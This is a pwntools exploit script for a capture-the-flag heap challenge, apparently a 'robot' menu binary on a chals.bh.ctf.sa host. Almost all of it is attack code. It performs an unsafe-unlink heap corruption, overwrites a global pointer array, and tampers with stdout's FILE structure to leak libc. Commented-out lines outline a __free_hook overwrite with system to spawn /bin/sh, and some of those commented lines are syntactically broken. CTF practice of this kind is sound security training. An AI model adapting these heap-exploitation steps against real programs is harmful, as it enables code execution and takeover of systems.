#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host blackhat4-cca3bafe4e0fc0910a848657595c2c83-0.chals.bh.ctf.sa --port 443 ./main
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./main')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'blackhat4-cca3bafe4e0fc0910a848657595c2c83-0.chals.bh.ctf.sa'
port = int(args.PORT or 443)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port, ssl=True, sni=host)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x3ff000)

io = start()

libc = exe.libc
def add_robot(sz):
    io.sendlineafter(b"> ",b'1')
    io.sendafter(b":\n",str(sz))

def edit_robot(idx,data):
    io.sendlineafter(b"> ",b'2')
    io.sendlineafter(b":\n",str(idx))
    io.sendafter(b":\n",str(data))

def delete_robot(idx):
    io.sendlineafter(b"> ",b'3')
    io.sendlineafter(b":\n",str(idx))

# unsafe unlink
# def add_robot(size):
#     p.sendlineafter(">", "1")
#     p.sendlineafter("size:", str(size))

# def edit_robot(ind, content):
#     p.sendlineafter(">", "2")
#     p.sendlineafter("slot:", str(ind))
#     p.sendlineafter("robot:", content)

# def delete_robot(ind):
#     p.sendlineafter(">", "3")
#     p.sendlineafter("slot:", str(ind))

robots = 0x404100
add_robot(0x110)
add_robot(0x110)
add_robot(0x110)
add_robot(9999)
delete_robot(0)
delete_robot(1)
delete_robot(2)
delete_robot(3)
add_robot(0x110)
add_robot(0x410)
add_robot(0x110)

p = ''
p += p64(0) + p64(0x111) 
# p += p64(robots - 8*3)+ p64(robots - 8*2)
p += p64(robots-0x18) + p64(robots-0x10) 
p += b'\x00'*0xf0 # 1024 0x400
p += p64(0x110) + p64(0x420)

edit_robot(3, p)

delete_robot(1)
edit_robot(0, p64(0)*3 + p64(0x4040c0))
edit_robot(0, p64(0x7fffffff7fffffff)*4 + p64(1)*4 + p64(0x4040c0))
edit_robot(3, p64(0) + p64(0x531) + p64(0) + p64(robots+0x08) + p64(0)*2)
add_robot(0x520)
edit_robot(0, p64(0x0000005a0000005a)*4)
edit_robot(0, p64(0x7fffffff7fffffff)*4 + p64(1)*4 + p64(0x4040c0) + p64(0)*2 + b'\x60\x87')
edit_robot(3, p64(0xfbad3c80) + p64(0x0)*3)
# libc_leak = int(codecs.encode(p.recvuntil("\x7f", timeout=1)[-6:][::-1], 'hex'), 16)
# libc_leak = int(codecs.encode(p.recvuntil("\x7f", timeout=1)[-6:][::-1], 'hex'), 16)
# print(hex(libc_leak))

# libc_base = libc_leak - 0x3eb780
# system = libc_base + 0x4f420
# free_hook = libc_base + 0x3ed8e8

# edit_robot(0, b'/bin/sh\x00' + p64(0x7fffffff7fffffff)3 + p64(1)4 + p64(0x4040c0) + p64(0)*1 + p64(free_hook))
# edit_robot(2, p64(system))
# delete_robot(0)

io.interactive()

